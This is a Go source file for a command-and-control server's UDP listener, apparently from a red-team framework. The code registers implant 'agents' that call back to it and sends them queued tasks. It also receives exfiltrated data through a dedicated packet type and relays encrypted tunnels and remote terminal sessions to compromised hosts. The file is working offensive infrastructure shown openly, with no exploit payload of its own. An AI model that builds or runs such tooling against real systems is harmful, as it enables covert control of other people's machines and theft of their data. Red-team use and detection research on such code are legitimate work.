package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

type UDPConfig struct {
	HostBind           string `json:"host_bind"`
	PortBind           int    `json:"port_bind"`
	Callback_addresses string `json:"callback_addresses"`
	EncryptKey         string `json:"encrypt_key"`

	TcpBanner   string `json:"tcp_banner"`
	ErrorAnswer string `json:"error_answer"`
	Timeout     int    `json:"timeout"`

	Protocol string `json:"protocol"`
}

type Connection struct {
	conn         *net.UDPConn
	remoteAddr   *net.UDPAddr
	ctx          context.Context
	handleCancel context.CancelFunc
}

type UDP struct {
	AgentConnects Map
	JobConnects   Map
	Listener      net.PacketConn
	Config        UDPConfig
	Name          string
	Active        bool
}

const (
	INIT_PACK     = 1
	EXFIL_PACK    = 2
	JOB_PACK      = 3
	TUNNEL_PACK   = 4
	TERMINAL_PACK = 5
)

type StartMsg struct {
	Type int    `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type InitPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

type ExfilPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type JobPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type TunnelPack struct {
	Id        uint   `msgpack:"id"`
	Type      uint   `msgpack:"type"`
	ChannelId int    `msgpack:"channel_id"`
	Key       []byte `msgpack:"key"`
	Iv        []byte `msgpack:"iv"`
	Alive     bool   `msgpack:"alive"`
	Reason    byte   `msgpack:"reason"`
}

type TermPack struct {
	Id     uint   `msgpack:"id"`
	TermId int    `msgpack:"term_id"`
	Key    []byte `msgpack:"key"`
	Iv     []byte `msgpack:"iv"`
	Alive  bool   `msgpack:"alive"`
	Status string `msgpack:"status"`
}

func (handler *UDP) Start(ts Teamserver) error {
	var err error = nil
	address := fmt.Sprintf("%s:%d", handler.Config.HostBind, handler.Config.PortBind)

	fmt.Println("  ", "Started UDP listener: "+address)

	handler.Listener, err = net.ListenPacket("udp", address)
	if err != nil {
		return err
	}

	go func() {
		buf := make([]byte, 65535)
		for {
			n, addr, err := handler.Listener.ReadFrom(buf)
			if err != nil {
				return
			}

			data := make([]byte, n)
			copy(data, buf[:n])

			udpAddr, ok := addr.(*net.UDPAddr)
			if !ok {
				continue
			}

			go handler.handleConnection(data, udpAddr, ts)
		}
	}()

	handler.Active = true
	return err
}

func (handler *UDP) handleConnection(data []byte, remoteAddr *net.UDPAddr, ts Teamserver) {
	var (
		sendData []byte
		recvData []byte
		encKey   []byte
		err      error
		initMsg  StartMsg
	)

	udpConn := handler.Listener.(*net.UDPConn)

	connection := Connection{
		conn:       udpConn,
		remoteAddr: remoteAddr,
	}
	connection.ctx, connection.handleCancel = context.WithCancel(context.Background())

	recvData = data

	encKey, err = hex.DecodeString(handler.Config.EncryptKey)
	if err != nil {
		goto ERR
	}
	recvData, err = DecryptData(recvData, encKey)
	if err != nil {
		goto ERR
	}

	err = msgpack.Unmarshal(recvData, &initMsg)
	if err != nil {
		goto ERR
	}

	switch initMsg.Type {

	case INIT_PACK:

		var initPack InitPack
		err := msgpack.Unmarshal(initMsg.Data, &initPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", initPack.Id)
		agentType := fmt.Sprintf("%08x", initPack.Type)
		ExternalIP := strings.Split(remoteAddr.String(), ":")[0]

		if !ModuleObject.ts.TsAgentIsExists(agentId) {
			_, err = ModuleObject.ts.TsAgentCreate(agentType, agentId, initPack.Data, handler.Name, ExternalIP, false)
			if err != nil {
				goto ERR
			}
		} else {
			emptyMark := ""
			_ = ModuleObject.ts.TsAgentUpdateDataPartial(agentId, struct {
				Mark *string `json:"mark"`
			}{Mark: &emptyMark})
		}

		handler.AgentConnects.Put(agentId, connection)

		for {
			sendData, err = ModuleObject.ts.TsAgentGetHostedTasks(agentId, 0x1900000)
			if err != nil {
				break
			}

			if sendData != nil && len(sendData) > 0 {
				err = sendMsg(udpConn, remoteAddr, sendData)
				if err != nil {
					break
				}

				recvData, err = recvMsg(udpConn, remoteAddr)
				if err != nil {
					break
				}

				_ = ModuleObject.ts.TsAgentSetTick(agentId)

				_ = ModuleObject.ts.TsAgentProcessData(agentId, recvData)
			} else {
				time.Sleep(100 * time.Millisecond)
			}
		}

		disconnectMark := "Disconnect"
		_ = ts.TsAgentUpdateDataPartial(agentId, struct {
			Mark *string `json:"mark"`
		}{Mark: &disconnectMark})
		handler.AgentConnects.Delete(agentId)

	case EXFIL_PACK:

		var exfilPack ExfilPack
		err := msgpack.Unmarshal(initMsg.Data, &exfilPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", exfilPack.Id)

		if !ModuleObject.ts.TsTaskRunningExists(agentId, exfilPack.Task) {
			goto ERR
		}

		jcId := agentId + "-" + exfilPack.Task

		handler.JobConnects.Put(jcId, connection)

		for {
			recvData, err = recvMsg(udpConn, remoteAddr)
			if err != nil {
				break
			}
			_ = ModuleObject.ts.TsAgentProcessData(agentId, recvData)
		}

		handler.JobConnects.Delete(jcId)

	case JOB_PACK:

		var jobPack JobPack
		err := msgpack.Unmarshal(initMsg.Data, &jobPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", jobPack.Id)

		if !ModuleObject.ts.TsTaskRunningExists(agentId, jobPack.Task) {
			goto ERR
		}

		jcId := agentId + "-" + jobPack.Task

		handler.JobConnects.Put(jcId, connection)

		for {
			recvData, err = recvMsg(udpConn, remoteAddr)
			if err != nil {
				break
			}
			_ = ModuleObject.ts.TsAgentProcessData(agentId, recvData)
		}

		handler.JobConnects.Delete(jcId)

	case TUNNEL_PACK:

		var tunPack TunnelPack
		err := msgpack.Unmarshal(initMsg.Data, &tunPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", tunPack.Id)

		if !ModuleObject.ts.TsTunnelChannelExists(tunPack.ChannelId) {
			goto ERR
		}

		if !tunPack.Alive {
			if tunPack.Reason < 1 || tunPack.Reason > 8 {
				tunPack.Reason = 5
			}
			ts.TsTunnelConnectionHalt(tunPack.ChannelId, tunPack.Reason)
			return
		}

		ts.TsTunnelConnectionResume(agentId, tunPack.ChannelId, true)

		pr, pw, err := ModuleObject.ts.TsTunnelGetPipe(agentId, tunPack.ChannelId)
		if err != nil {
			goto ERR
		}

		blockEnc, _ := aes.NewCipher(tunPack.Key)
		encStream := cipher.NewCTR(blockEnc, tunPack.Iv)
		encWriter := &cipher.StreamWriter{S: encStream, W: udpConn}

		blockDec, _ := aes.NewCipher(tunPack.Key)
		decStream := cipher.NewCTR(blockDec, tunPack.Iv)
		decWriter := &cipher.StreamWriter{S: decStream, W: pw}

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				_ = pr.Close()
			})
		}

		var wg sync.WaitGroup

		wg.Add(1)
		go func() {
			defer wg.Done()
			io.Copy(encWriter, pr)
			closeAll()
		}()

		wg.Add(1)
		go func() {
			defer wg.Done()
			buf := make([]byte, 65535)
			for {
				n, err := udpConn.ReadFrom(buf)
				if err != nil {
					break
				}
				decWriter.Write(buf[:n])
			}
			closeAll()
		}()

		wg.Wait()

		ts.TsTunnelConnectionClose(tunPack.ChannelId)

	case TERMINAL_PACK:

		var termPack TermPack
		err := msgpack.Unmarshal(initMsg.Data, &termPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", termPack.Id)
		terminalId := fmt.Sprintf("%08x", termPack.TermId)

		if !ModuleObject.ts.TsTerminalConnExists(terminalId) {
			goto ERR
		}

		if !termPack.Alive {
			_ = ts.TsAgentTerminalCloseChannel(terminalId, termPack.Status)
			return
		}

		ts.TsTerminalConnResume(agentId, terminalId, true)

		pr, pw, err := ModuleObject.ts.TsTerminalGetPipe(agentId, terminalId)
		if err != nil {
			goto ERR
		}

		blockEnc, _ := aes.NewCipher(termPack.Key)
		encStream := cipher.NewCTR(blockEnc, termPack.Iv)
		encWriter := &cipher.StreamWriter{S: encStream, W: udpConn}

		blockDec, _ := aes.NewCipher(termPack.Key)
		decStream := cipher.NewCTR(blockDec, termPack.Iv)
		decWriter := &cipher.StreamWriter{S: decStream, W: pw}

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				_ = pr.Close()
			})
		}

		var wg sync.WaitGroup

		wg.Add(1)
		go func() {
			defer wg.Done()
			io.Copy(encWriter, pr)
			closeAll()
		}()

		wg.Add(1)
		go func() {
			defer wg.Done()
			buf := make([]byte, 65535)
			for {
				n, err := udpConn.ReadFrom(buf)
				if err != nil {
					break
				}
				decWriter.Write(buf[:n])
			}
			closeAll()
		}()

		wg.Wait()

		_ = ts.TsAgentTerminalCloseChannel(terminalId, "killed")
	}

	return

ERR:
	if len(handler.Config.ErrorAnswer) > 0 {
		_ = sendMsg(udpConn, remoteAddr, []byte(handler.Config.ErrorAnswer))
	}
}

func (handler *UDP) Stop() error {
	var (
		err          error = nil
		listenerPath       = ListenerDataDir + "/" + handler.Name
	)

	if handler.Listener != nil {
		_ = handler.Listener.Close()
	}

	handler.AgentConnects.ForEach(func(key string, valueConn interface{}) bool {
		connection, _ := valueConn.(Connection)
		if connection.handleCancel != nil {
			connection.handleCancel()
		}
		return true
	})

	_, err = os.Stat(listenerPath)
	if err == nil {
		err = os.RemoveAll(listenerPath)
		if err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	return nil
}

func recvMsg(conn *net.UDPConn, remoteAddr *net.UDPAddr) ([]byte, error) {
	buf := make([]byte, 65535)
	n, _, err := conn.ReadFromUDP(buf)
	if err != nil {
		return nil, err
	}

	data := buf[:n]

	bufLen := data[:4]
	msgLen := binary.BigEndian.Uint32(bufLen)

	if uint32(len(data)-4) < msgLen {
		return nil, fmt.Errorf("incomplete message")
	}

	return data[4 : 4+msgLen], nil
}

func sendMsg(conn *net.UDPConn, remoteAddr *net.UDPAddr, data []byte) error {
	if conn == nil {
		return errors.New("conn is nil")
	}

	msgLen := make([]byte, 4)
	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
	message := append(msgLen, data...)
	_, err := conn.WriteToUDP(message, remoteAddr)
	return err
}

func EncryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	return ciphertext, nil
}

func DecryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}
